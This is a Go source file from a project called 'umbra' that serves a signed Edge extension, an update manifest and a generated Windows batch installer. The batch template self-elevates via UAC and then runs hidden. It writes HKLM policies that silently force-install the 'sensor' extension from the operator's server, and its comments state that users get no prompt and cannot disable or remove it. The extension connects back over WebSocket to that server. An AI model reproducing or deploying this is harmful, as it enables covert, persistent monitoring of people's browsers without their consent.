package api

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/s045pd/umbra/internal/crxsign"
)

// crxAPI implements the public Edge / Chromium auto-install endpoints:
//
//	GET /ext/updates.xml          — Edge polls this every few hours
//	GET /ext/umbra-sensor.crx     — the signed extension package
//	GET /ext/install-edge.bat     — turnkey BAT for ops, with the live
//	                                Extension ID + URLs already baked in
//
// The endpoints are public on purpose: Edge fetches them without any
// session cookie. They expose only what the policy already names (the
// ID, an HTTPS URL, and the extension content) — nothing here makes
// the deployment more discoverable than the policy itself.
//
// crxAPI also caches the built CRX bytes per (wsURL, manifest version)
// so a fleet of Edge browsers polling at the same time hits one
// signature operation and one filesystem walk.
type crxAPI struct {
	signer     *crxsign.Signer
	sourcePath func() string
	publicURL  string

	mu        sync.Mutex
	cachedKey string // wsURL + ":" + version
	cachedCRX []byte
	cachedVer string
}

func (c *crxAPI) ServeUpdatesXML(w http.ResponseWriter, r *http.Request) {
	if c.signer == nil {
		JSONErr(w, http.StatusServiceUnavailable, "extension signing not configured")
		return
	}

	version, err := c.manifestVersion()
	if err != nil {
		JSONErr(w, http.StatusInternalServerError, err.Error())
		return
	}

	publicBase := c.resolvePublicBase(r)
	type updateCheck struct {
		XMLName  xml.Name `xml:"updatecheck"`
		Codebase string   `xml:"codebase,attr"`
		Version  string   `xml:"version,attr"`
	}
	type app struct {
		XMLName xml.Name    `xml:"app"`
		AppID   string      `xml:"appid,attr"`
		Update  updateCheck `xml:"updatecheck"`
	}
	type gupdate struct {
		XMLName  xml.Name `xml:"gupdate"`
		XMLNS    string   `xml:"xmlns,attr"`
		Protocol string   `xml:"protocol,attr"`
		App      app      `xml:"app"`
	}

	doc := gupdate{
		XMLNS:    "http://www.google.com/update2/response",
		Protocol: "2.0",
		App: app{
			AppID: c.signer.ExtensionID(),
			Update: updateCheck{
				Codebase: publicBase + "/ext/umbra-sensor.crx",
				Version:  version,
			},
		},
	}

	body, err := xml.MarshalIndent(doc, "", " ")
	if err != nil {
		JSONErr(w, http.StatusInternalServerError, "marshal update manifest: "+err.Error())
		return
	}

	w.Header().Set("Content-Type", "application/xml; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	_, _ = w.Write([]byte(xml.Header))
	_, _ = w.Write(body)
}

func (c *crxAPI) ServeCRX(w http.ResponseWriter, r *http.Request) {
	if c.signer == nil {
		JSONErr(w, http.StatusServiceUnavailable, "extension signing not configured")
		return
	}

	version, err := c.manifestVersion()
	if err != nil {
		JSONErr(w, http.StatusInternalServerError, err.Error())
		return
	}

	publicBase := c.resolvePublicBase(r)
	wsURL := deriveWSURL(publicBase)

	crxBytes, err := c.buildCachedCRX(wsURL, version)
	if err != nil {
		JSONErr(w, http.StatusInternalServerError, err.Error())
		return
	}

	w.Header().Set("Content-Type", "application/x-chrome-extension")
	w.Header().Set("Content-Disposition", `attachment; filename="umbra-sensor.crx"`)
	w.Header().Set("Cache-Control", "no-store")
	_, _ = w.Write(crxBytes)
}

func (c *crxAPI) ServeInstallEdgeBAT(w http.ResponseWriter, r *http.Request) {
	if c.signer == nil {
		JSONErr(w, http.StatusServiceUnavailable, "extension signing not configured")
		return
	}

	publicBase := c.resolvePublicBase(r)
	host := strings.TrimPrefix(publicBase, "https://")
	host = strings.TrimPrefix(host, "http://")
	if i := strings.Index(host, "/"); i >= 0 {
		host = host[:i]
	}

	bat := renderEdgeBAT(c.signer.ExtensionID(), publicBase+"/ext/updates.xml", publicBase, host)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", `attachment; filename="umbra-edge-deploy.bat"`)
	_, _ = w.Write([]byte(bat))
}

// buildCachedCRX returns a CRX whose bundled WS URL matches wsURL.
// The cache key is (wsURL, version) so that a content change (manifest
// bump or different proxy host) invalidates a stale CRX.
func (c *crxAPI) buildCachedCRX(wsURL, version string) ([]byte, error) {
	key := wsURL + "@" + version

	c.mu.Lock()
	if c.cachedKey == key && c.cachedCRX != nil {
		out := c.cachedCRX
		c.mu.Unlock()
		return out, nil
	}
	c.mu.Unlock()

	mainDir, err := filepath.EvalSymlinks(filepath.Join(c.sourcePath(), "main"))
	if err != nil {
		return nil, fmt.Errorf("locate extension source: %w", err)
	}

	// No obfuscation on the auto-install path: keeping bytes
	// deterministic per (wsURL, version) makes CRX hashes
	// reproducible for ops debugging, and Edge gates re-downloads
	// on the manifest version anyway.
	var zb bytes.Buffer
	zw := zip.NewWriter(&zb)
	opts := &buildOpts{wsURL: wsURL, obfuscate: false}
	if err := buildStandalone(zw, mainDir, opts); err != nil {
		return nil, fmt.Errorf("build standalone zip: %w", err)
	}
	if err := zw.Close(); err != nil {
		return nil, fmt.Errorf("close zip: %w", err)
	}

	crxBytes, err := c.signer.BuildCRX(zb.Bytes())
	if err != nil {
		return nil, fmt.Errorf("sign crx: %w", err)
	}

	c.mu.Lock()
	c.cachedKey = key
	c.cachedCRX = crxBytes
	c.cachedVer = version
	c.mu.Unlock()
	return crxBytes, nil
}

// manifestVersion reads the version field from extension/main/manifest.json.
// Edge will only re-download the CRX when this string changes; bumping the
// manifest version is therefore the way to force a refresh.
func (c *crxAPI) manifestVersion() (string, error) {
	mfPath := filepath.Join(c.sourcePath(), "main", "manifest.json")
	raw, err := os.ReadFile(mfPath) //nolint:gosec // operator-controlled path
	if err != nil {
		return "", fmt.Errorf("read manifest: %w", err)
	}
	var m struct {
		Version string `json:"version"`
	}
	if err := json.Unmarshal(raw, &m); err != nil {
		return "", fmt.Errorf("parse manifest: %w", err)
	}
	if m.Version == "" {
		return "", fmt.Errorf("manifest missing version")
	}
	return m.Version, nil
}

// resolvePublicBase prefers the operator-configured PublicURL, falls back
// to inferring from request headers (proxy-aware).
func (c *crxAPI) resolvePublicBase(r *http.Request) string {
	if c.publicURL != "" {
		return strings.TrimRight(c.publicURL, "/")
	}
	scheme := "https"
	if proto := r.Header.Get("X-Forwarded-Proto"); proto != "" {
		scheme = proto
	} else if r.TLS == nil {
		scheme = "http"
	}
	host := r.Host
	if fwd := r.Header.Get("X-Forwarded-Host"); fwd != "" {
		host = fwd
	}
	return fmt.Sprintf("%s://%s", scheme, host)
}

// deriveWSURL turns "https://host[:port]" into "wss://host:4343".
// Falls back to ws:// if the public base is plain HTTP.
func deriveWSURL(publicBase string) string {
	scheme := "wss"
	stripped := publicBase
	switch {
	case strings.HasPrefix(stripped, "https://"):
		stripped = strings.TrimPrefix(stripped, "https://")
	case strings.HasPrefix(stripped, "http://"):
		stripped = strings.TrimPrefix(stripped, "http://")
		scheme = "ws"
	}
	if i := strings.Index(stripped, "/"); i >= 0 {
		stripped = stripped[:i]
	}
	if i := strings.Index(stripped, ":"); i >= 0 {
		stripped = stripped[:i]
	}
	return fmt.Sprintf("%s://%s:4343", scheme, stripped)
}

// renderEdgeBAT produces the BAT we hand to ops. UAC self-elevation is the
// only way to write HKLM on a personal PC; that's an unavoidable single
// click. Everything after the elevation runs in a hidden window.
func renderEdgeBAT(extID, updatesURL, publicBase, hostOnly string) string {
	// %~f0 self-path. The admin probe reads the LOCAL_SERVICE hive, which
	// only succeeds for Administrators. If denied, Start-Process -Verb
	// RunAs re-launches the same .bat elevated.
	const tmpl = `@echo off
:: Umbra Sensor — Microsoft Edge silent force-install via Enterprise Policy
:: Generated by umbra-server. ID and URL are baked in below.
::
::   Extension ID : %[1]s
::   updates.xml  : %[2]s
::   CRX host     : %[3]s
::
:: This script writes HKLM policies, which requires admin. The first run
:: triggers exactly one UAC prompt; everything afterwards is silent.
:: Once applied, Edge installs the extension on next launch with no
:: install bubble, no review prompt, and the user cannot disable or
:: remove it.

>nul 2>&1 reg query "HKU\S-1-5-19" || (
  powershell -NoProfile -Command "Start-Process -Verb RunAs -WindowStyle Hidden -FilePath '%%~f0'" >nul 2>&1
  exit /b
)

setlocal
set "EXTID=%[1]s"
set "UPDATES_URL=%[2]s"
set "ALLOW_HOST=%[4]s"

reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%%EXTID%%;%%UPDATES_URL%%" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallAllowlist" /v "1" /t REG_SZ /d "%%EXTID%%" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallSources"   /v "1" /t REG_SZ /d "https://%%ALLOW_HOST%%/*" /f >nul 2>&1

:: Suppress the "external extension was installed" prompt that Edge would
:: otherwise show for sideloads. force-install items don't trigger it,
:: but setting this kills any leftovers from earlier deployments.
reg add "HKLM\Software\Policies\Microsoft\Edge" /v "ExternalExtensionsBlocked" /t REG_DWORD /d 1 /f >nul 2>&1

:: Refresh policies immediately. No-op on non-domain machines but harmless.
gpupdate /target:computer /force >nul 2>&1

endlocal
exit /b 0
`
	return fmt.Sprintf(tmpl, extID, updatesURL, publicBase, hostOnly)
}
